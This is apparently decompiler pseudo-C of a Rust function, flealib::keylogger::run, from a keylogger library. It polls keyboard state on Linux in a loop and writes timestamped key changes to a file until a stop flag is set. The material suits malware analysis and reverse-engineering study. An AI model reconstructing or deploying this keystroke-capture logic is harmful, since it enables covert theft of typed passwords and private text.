long long flealib::keylogger::run(struct_0 *a0, unsigned long long a1)
{
    unsigned int v0;  // [bp-0x12c]
    void* v1;  // [bp-0x128]
    int v2;  // [bp-0x128]
    unsigned long long v3;  // [bp-0x120]
    char *v4;  // [bp-0x118]
    unsigned long long v5;  // [bp-0x108]
    unsigned long long v6;  // [bp-0x100]
    unsigned long long v7;  // [bp-0xf8]
    unsigned int v8;  // [bp-0xf0], Other Possible Types: unsigned long long
    char v9;  // [bp-0xee]
    char v10;  // [bp-0xec], Other Possible Types: unsigned short
    char *v11;  // [bp-0xe8], Other Possible Types: unsigned long long
    void* v12;  // [bp-0xe0], Other Possible Types: unsigned long long
    void* v13;  // [bp-0xd8], Other Possible Types: char
    char *v14;  // [bp-0xc8], Other Possible Types: char
    unsigned long long v15;  // [bp-0xc0]
    struct_0 *v16;  // [bp-0xb0]
    int v17;  // [bp-0xa8]
    unsigned long long v18;  // [bp-0xa8]
    unsigned long long v19;  // [bp-0xa0]
    char *v20;  // [bp-0x98], Other Possible Types: unsigned long
    unsigned long long v21;  // [bp-0x90]
    void* v22;  // [bp-0x88]
    char *v23;  // [bp-0x50]
    unsigned long long v24;  // [bp-0x48]
    char v25;  // [bp-0x40]
    unsigned long long v28;  // rax
    unsigned long long v29;  // rdx
    struct_2 *v31;  // rax
    char v32;  // sil

    v5 = a1;
    v16 = a0;
    v6 = device_query::device_state::linux::DeviceState::new();
    v1 = 0;
    v3 = 1;
    v4 = 0;
    v7 = 0x1b600000000;
    v10 = 0;
    v8 = 0;
    v10 = 1;
    v9 = 1;
    v20 = a0->field_10;
    *((uint128_t *)&v17) = a0->field_0;
    v14.open(&v7, &(char)v17);
    v0 = v14.expect();
    v25.now();
    v7 = "%Y-%m-%d %H:%M:%S[]\n";
    v8 = 17;
    v11 = 8;
    v12 = 0;
    v13 = 0;
    (char)v17.format_with_items(&v25, &v7);
    v14.spec_to_string(&(char)v17);
    v23 = &v14;
    v24 = <alloc::string::String as core::fmt::Debug>::fmt;
    v7 = &g_b0b9b0;
    v8 = 2;
    v13 = 0;
    v11 = &v23;
    v12 = 1;
    v0.write_fmt(&v7).expect(&g_b0b9e8);
    ::0x7a1b50::core::ptr::drop_in_place<alloc::string::String>(&v14);
    ::0x7a1a90::core::ptr::drop_in_place<chrono::format::formatting::DelayedFormat<chrono::format::strftime::StrftimeItems>>(&(char)v17);
    while (true)
    {
        v7.get_keys(&v6);
        v28 = 1.index(v4);
        if (!(char)v8.equal(v11, v28, v29) && v11)
        {
            v14 = &v7;
            v15 = <alloc::vec::Vec<T,A> as core::fmt::Debug>::fmt;
            v18 = &g_44fb30;
            v19 = 1;
            v22 = 0;
            v20 = &v14;
            v21 = 1;
            v0.write_fmt(&v18).expect(&g_b0ba00);
        }
        v20 = v11;
        *((int128_t *)&v17) = *((int128_t *)&v7);
        core::ptr::drop_in_place<alloc::vec::Vec<device_query::keymap::Keycode>>(&v1);
        v4 = v20;
        *((int128_t *)&v2) = (int128_t)v17;
        (char)v17.lock(v5 + 16);
        v31 = (char)v17.unwrap();
        v32 = (char)v29 & 1;
        if (v31->field_5)
            break;
        core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v31, v32);
        std::thread::sleep(0, &g_989680);
    }
    core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v31, v32);
    ::0x7a1b00::core::ptr::drop_in_place<std::fs::File>(v0);
    core::ptr::drop_in_place<alloc::vec::Vec<device_query::keymap::Keycode>>(&v1);
    core::ptr::drop_in_place<device_query::device_state::linux::DeviceState>(&v6);
    return core::ptr::drop_in_place<alloc::sync::Arc<std::sync::mutex::Mutex<flealib::keylogger::Keylogger>>>(&v5);
}
